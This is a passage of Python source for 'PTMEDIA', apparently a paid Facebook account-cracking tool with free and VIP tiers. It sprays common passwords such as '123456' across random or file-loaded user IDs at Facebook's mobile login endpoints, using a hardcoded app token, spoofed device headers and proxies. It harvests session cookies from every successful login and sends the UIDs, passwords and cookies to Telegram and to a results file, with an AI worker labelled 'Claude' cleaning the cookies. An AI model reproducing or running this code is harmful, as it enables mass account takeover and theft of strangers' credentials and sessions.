    print(G + "       [>] EXAMPLE: 20000 / 30000 / 99999")
    limit = safe_input(G + "       SELECT  " + Y).strip()
    linex()
    for _ in range(int(limit)):
        user.append(str(random.randint(4, 9999999999)))
    print(G + "       (A) METHOD 1")
    print(G + "       (B) METHOD 2")
    linex()
    meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(G + f"       [>] TOTAL ID: {limit}")
        linex()
        send_notification(f"Starting Scan 2004-2007 (Range) | Amount: {limit}")
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(G + "    [!] INVALID METHOD SELECTED" + N)
                break


def old_Five():
    user = []
    ____banner____()
    print(G + "       [>] CRACK FROM FILE UID")
    linex()
    file_path = safe_input(G + "       FILE PATH (Default: uid.txt) " + Y + ": " + G).strip() or 'uid.txt'
    try:
        with open(file_path, 'r') as f:
            lines = f.read().splitlines()
    except Exception as e:
        print(G + f"\n    [!] File Not Found or Error: {e}" + N)
        time.sleep(2)
        return old_clone()

    for line in lines:
        if not line.strip(): continue
        uid = line.split('|')[0].strip()
        if uid.isdigit():
            user.append(uid)

    if not user:
        print(G + f"\n    [!] Warning: No valid UIDs found in {file_path}!" + N)
        time.sleep(2)
        return old_clone()

    print(G + f"\n    [+] Successfully loaded {len(user)} UIDs!" + N)
    
    # Logic tối ưu cho Anh Tiến: Xóa con đã check khỏi file gốc ngay lập tức
    print(Y + "    [~] Cleaning source file (Removing checked UIDs)..." + N)
    rem_count = clean_source_file(file_path)
    print(G + f"    [OK] File cleaned. Remaining: {rem_count} UIDs" + N)
    time.sleep(1)

    print(G + "       (A) METHOD 1")
    print(G + "       (B) METHOD 2")
    linex()
    meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
    load_checked_uids()
    with tred(max_workers=30) as pool:
        ____banner____()
        filtered_user = [u for u in user if u not in CHECKED_UIDS]
        skip_count = len(user) - len(filtered_user)
        
        print(G + f"       [>] TOTAL ID: {len(user)}")
        if skip_count > 0:
            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
        print(G + "       [>] USE AIRPLANE MODE FOR BEST RESULT")
        linex()
        send_notification(f"Starting File UID Scan | Amount: {len(filtered_user)}")
        for uid in filtered_user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(G + "    [!] INVALID METHOD SELECTED" + N)
                break

# ============================================================
#  LOGIN METHODS + COOKIE EXTRACT + Claude QUEUE
# ============================================================
results_queue = queue.Queue()

# Khoi dong Claude worker thread
ds_thread = Thread(target=Claude_worker, args=(results_queue,), daemon=True)
ds_thread.start()

def login_1(uid):
    global loop
    session = requests.session()
    if PROXIES:
        session.proxies.update(PROXIES)
    try:
        sys.stdout.write(
            f"\r{G}+{N}({G}PTMEDIA SCANNING{N})({Y}{loop}{N})({G}OK{N})({Y}{len(oks)}{N})   "
        )
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False, timeout=20
            ).json()

            cookies_raw = extract_cookies(session)
            if not cookies_raw:
                cookies_raw = extract_cookies_from_res(res)
            
            # Sử dụng AI xử lý Cookie sạch trước khi gửi đi
            cookies_str = ai_clean_cookie(cookies_raw)

            if 'session_key' in res:
                year = creationyear(uid)
                status = check_fb_live(uid)
                if status == "LIVE":
                    print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
                send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
                open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                results_queue.put((uid, pw, year, status, cookies_str))
                oks.append(uid)
                break
            elif 'error' in res:
                err_data = res.get('error', {})
                err_msg = err_data.get('message', '')
                err_sub = err_data.get('error_subcode', 0)
                
                # Logic: Detect Unverified Email (Anh Tiến Request)
                if err_sub == 1348058 or "confirm their e-mail address" in err_msg:
                    year = creationyear(uid)
                    status = "Email Not Verified! Please login and add email ⚠️"
                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - {status}{N}")
                    send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
                    open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                    results_queue.put((uid, pw, year, status, cookies_str))
                    oks.append(uid)
                    break
                
                # Other checkpoint/live cases
                elif 'www.facebook.com' in err_msg:
                    year = creationyear(uid)
                    status = check_fb_live(uid)
                    if status == "LIVE":
                        print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
                        send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
                        open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                        results_queue.put((uid, pw, year, status, cookies_str))
                        oks.append(uid)
                    else:
                        # Log to die.txt (Phase V)
                        open('die.txt', 'a').write(f"{uid}\n")
                    break
        loop += 1
        if not IS_VIP and len(oks) >= LOOP_LIMIT:
            print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} LIVE ACCS (FREE VERSION). PLEASE UPGRADE TO PRO/VIP!" + N)
            time.sleep(3)
            return

    except Exception:
        time.sleep(3)


def login_2(uid):
    global loop
    sys.stdout.write(
        f"\r{G}+{N}({G}PTMEDIA SCANNING{N})({Y}{loop}{N})({G}OK{N})({Y}{len(oks)}{N})   "
    )
    sys.stdout.flush()
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            session = requests.Session()
            if PROXIES:
                session.proxies.update(PROXIES)
            headers = {
                'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                'x-fb-sim-hni': str(rr(20000, 40000)),
                'x-fb-net-hni': str(rr(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': window1(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = (f"https://b-api.facebook.com/method/auth.login"
                   f"?format=json&email={uid}&password={pw}"
                   f"&credentials_type=device_based_login_password"
                   f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                   f"&source=device_based_login"
                   f"&meta_inf_fbmeta=%20%C2%A4tly_logged_in_userid=0"
                   f"&method=GET&locale=en_US&client_country_code=US"
                   f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                   f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                   f"&fb_api_req_friendly_name=authenticate&cpl=true")
            po = session.get(url, headers=headers, timeout=20).json()
            cookies_raw = extract_cookies(session)
            if not cookies_raw:
                cookies_raw = extract_cookies_from_res(po)
            
            cookies_str = ai_clean_cookie(cookies_raw)

            if 'session_key' in str(po) or 'session_key' in po:
                year = creationyear(uid)
                status_raw = check_fb_live(uid)
                
                # Secondary check for unverified email in login_2 response if available
                res_str = str(po)
                if '1348058' in res_str or "confirm their e-mail address" in res_str:
                    status = "Email Not Verified! Please login and add email ⚠️"
                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - {status}{N}")
                else:
                    status = status_raw
                    if status == "LIVE":
                        print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
                
                send_to_tele(uid, pw, year, status, cookies_str, full_json=po)
                open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                results_queue.put((uid, pw, year, status, cookies_str))
                oks.append(uid)
                break
        except:
            pass
    loop += 1
    if not IS_VIP and len(oks) >= LOOP_LIMIT:
        print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} LIVE ACCS (FREE VERSION). PLEASE UPGRADE TO PRO/VIP!" + N)
        time.sleep(3)
        return


if __name__ == '__main__':
    verify_license() # Xác thực License ngay khi khởi động
    main_panel()
